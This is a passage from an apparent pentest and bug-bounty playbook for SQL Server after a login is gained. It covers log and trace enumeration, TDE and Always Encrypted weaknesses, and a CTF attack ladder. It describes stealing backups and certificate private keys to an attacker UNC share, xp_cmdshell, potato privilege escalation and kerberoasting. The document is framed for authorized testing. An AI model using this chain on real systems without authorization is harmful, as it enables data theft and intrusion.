Two always-on sources tell you what already happened on this instance — other actors, prior config changes, and (critically) what *your* steps just logged. Read them to deconflict and to scope your own footprint.

```sql
-- ERRORLOG: config changes, failed/successful logins, startup options.
-- param order: (log#, 1=SQL log, search1, search2)
EXEC master..xp_readerrorlog 0, 1, N'xp_cmdshell';      -- prior enable/disable events
EXEC master..xp_readerrorlog 0, 1, N'Login', N'failed'; -- spray/lateral-movement evidence
EXEC master..xp_readerrorlog 0, 1, N'Configuration option';  -- every sp_configure RECONFIGURE

-- Default trace: object creation, sp_configure, Audit events (on unless disabled)
DECLARE @p NVARCHAR(260);
SELECT @p = CAST(value AS NVARCHAR(260)) FROM fn_trace_getinfo(DEFAULT) WHERE property = 2;
SELECT TOP 200 StartTime, DatabaseName, LoginName, HostName, ApplicationName, TextData
  FROM fn_trace_gettable(@p, DEFAULT)
  WHERE TextData LIKE '%xp_cmdshell%' OR TextData LIKE '%sp_configure%'
     OR TextData LIKE '%ASSEMBLY%' OR TextData LIKE '%OLE Automation%'
  ORDER BY StartTime DESC;
```

`xp_readerrorlog` is sysadmin-gated (the documented `sp_readerrorlog` wants `VIEW SERVER STATE`); the default trace reader wants `ALTER TRACE`/sysadmin. Why this is a rung, not an afterthought: it reveals whether another actor already enabled xp_cmdshell (deconfliction), gives defenders-eye evidence for the report, and — most practically — shows you exactly which of *your* sp_configure/CREATE ASSEMBLY actions are now sitting in the trace, so your "leave it as found" cleanup (reverts, dropped procs, deleted temp files) is complete and honest.

**Evidence standard:** quote the relevant trace/ERRORLOG rows with timestamps when citing prior abuse; when documenting your own footprint, list every event your steps generated alongside the reverts that address them.

### S11 — Encryption blind spots: Always Encrypted and TDE (new)

Two features that look like data protection but behave very differently against a live SQL login — know which is a real barrier and which is theatre for your threat model.

- **TDE (Transparent Data Encryption)** is **not** a barrier to a post-credential attacker. It encrypts data *at rest* (the MDF/LDF files and backups); a working SQL login reads fully decrypted rows, because the engine decrypts transparently on every page read. TDE only matters if your primitive is **file theft**: if you exfiltrate the `.mdf`/`.bak` (e.g. via S8 `BACKUP ... TO DISK` to your UNC, or S7 file read of a backup), you cannot open it without the **DEK** → which is protected by the **server certificate in `master`** → protected by the DMK/service master key. To make a stolen backup readable you must also steal that certificate and its private key (`BACKUP CERTIFICATE ... WITH PRIVATE KEY (FILE=..., ENCRYPTION BY PASSWORD=...)` to a UNC). So: owning the login beats TDE outright; stealing files means stealing the cert too.

- **Always Encrypted** *is* a genuine blind spot. The engine only ever holds ciphertext — the Column Encryption Key is unwrapped by the **Column Master Key**, which lives client-side (cert store, Key Vault, HSM). A sysadmin login querying an Always-Encrypted column gets **ciphertext back**, period; the role does not grant decryption. The attacker's lever is *where the CMK lives*: if the CMK is a certificate in the SQL **host's** `CurrentUser`/`LocalMachine` store (a common misconfiguration), then **host-level** compromise (via your OS foothold from S3/S4) yields both the ciphertext and the key — decryption follows. If the CMK is in Key Vault/HSM the column stays opaque to you. Enclave-enabled configurations move some computation server-side but still do not hand the engine the plaintext at rest.

```sql
-- inventory encrypted surface before promising (or dismissing) impact
SELECT name, is_encrypted FROM sys.databases;                     -- TDE at rest
SELECT name FROM sys.certificates WHERE pvt_key_encryption_type_desc <> 'NO_PRIVATE_KEY';
SELECT c.name AS col, t.name AS tbl, c.encryption_type_desc       -- Always Encrypted columns
  FROM sys.columns c JOIN sys.tables t ON c.object_id = t.object_id
  WHERE c.encryption_type IS NOT NULL;
SELECT name, key_store_provider_name FROM sys.column_master_keys;  -- CMK location = your lever
```

**Evidence standard:** state the barrier honestly in the report. For TDE: "post-credential read is unaffected; file-theft impact depends on also capturing the server certificate" + the `is_encrypted` + cert inventory. For Always Encrypted: capture a column returning ciphertext under your login to prove the protection holds, then report CMK location (`key_store_provider_name`) as the residual risk — "columns are opaque to a SQL login; a CMK in the host certificate store means OS compromise defeats it" is the defensible, non-overclaimed finding.

### CTF notes — where this ladder shows up on boxes vs. bounty

The post-credential ladder is a staple of HTB/Proving-Grounds/OSCP-style AD boxes, usually in one of these shapes: **sa login → xp_cmdshell → `whoami /priv` shows `SeImpersonatePrivilege` → potato-class privesc to SYSTEM** (the single most common MSSQL box line); **low-priv login → `EXECUTE AS LOGIN='sa'`** where an IMPERSONATE grant was left on the app login; **linked-server crawl** from a DMZ instance to a domain instance mapping `sa`; **TRUSTWORTHY + db_owner → sysadmin** (S1); and **kerberoast `MSSQLSvc` → crack → login** or **silver ticket into the instance** (Phase 8). What differs under a bounty program: every `sp_configure` toggle is **DESTRUCTIVE** and needs a revert + disclosure (a CTF leaves xp_cmdshell on; a bounty must restore it); **no spraying at volume** against 1433; impersonation/linked-server pivots that cross into out-of-scope instances or domains are **scope violations** even though the technique works — enumerate the target *before* pivoting; and Always Encrypted/TDE are rarely worth deep exploitation in a bounty (file-theft chains are usually out of scope), where on a CTF the flag may well sit in a backup you decrypt. The ladder is identical; the restraint and the revert discipline are the bounty-only half.

### Current-year advisory note (CVE-light, per focus)

The 2026 SQL Server advisories are patch-gated memory-corruption bugs, not post-credential technique primitives: **CVE-2026-94511** (heap overflow, authenticated network RCE, SQL Server 2017–2025, November 2026 GDR) and **CVE-2026-96956** (stack overflow → SYSTEM elevation, October 2026) both require an existing authorized connection and a crafted payload — relevant only as a one-line "is the build patched?" check during S1 fingerprinting, confirmed against the MSRC Security Update Guide and the KB for the running build (`ProductVersion` from S1 maps to the patch level). They do not change the ladder above; the in-engine primitives are the durable craft.

*Supplement added 2026-11-19 (claude-opus-4-8). Primitives verified against Microsoft Learn primary docs (sp_OACreate / OLE Automation Procedures, OPENROWSET BULK rowset provider, EXECUTE AS, linked servers & ad-hoc distributed queries, default trace / fn_trace_gettable, Always Encrypted & TDE key hierarchy) and xp_readerrorlog usage notes; 2026 MSRC advisories (CVE-2026-94511, CVE-2026-96956) spot-checked against vendor update guidance — treat MSRC as authoritative over aggregators. Focus per brief: TTPs for finding and proving weaknesses from a single SQL login; CVEs older than ~1 year carry at most one line of historical context.*
